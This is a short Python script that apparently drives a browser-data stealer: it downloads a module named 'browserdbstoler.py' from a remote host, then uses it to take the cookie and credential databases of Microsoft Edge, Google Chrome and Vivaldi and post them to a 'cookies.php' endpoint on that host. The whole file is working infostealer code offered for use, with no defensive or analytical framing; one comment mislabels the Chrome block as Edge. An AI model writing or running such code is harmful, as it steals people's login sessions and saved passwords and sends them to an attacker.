import urllib.request
import os
os.system("cls")
os.chdir(os.path.dirname(os.path.abspath(__file__)))

HOST = "https://example.com/BDBS"
POST_URI = str(f"{HOST}/cookies.php")
DOWNLOAD_BIN = str(f"{HOST}/browserdbstoler.py")

if not os.path.isfile("browserdbstoler.py"):
    urllib.request.urlretrieve(DOWNLOAD_BIN, "browserdbstoler.py")

from browserdbstoler import BDBS_Chromium, Chromium

# For stole Microsoft Edge DB:
microsoft_edge = BDBS_Chromium(POST_URI, Chromium.MICROSOFT_EDGE)
stole = microsoft_edge.stoleChromium()

# For stole Microsoft Edge DB:
google_chrome = BDBS_Chromium(POST_URI, Chromium.GOOGLE_CHROME)
stole = google_chrome.stoleChromium()

# If u want a Chromium based browser thats not in the Chromium.Enum class:
vivaldi = BDBS_Chromium(POST_URI, [
    "Local\\Vivaldi", # User Data root directory
    "Vivaldi Technologies", # browser author name
    "Vivaldi" # browser name
])
stole = vivaldi.stoleChromium()
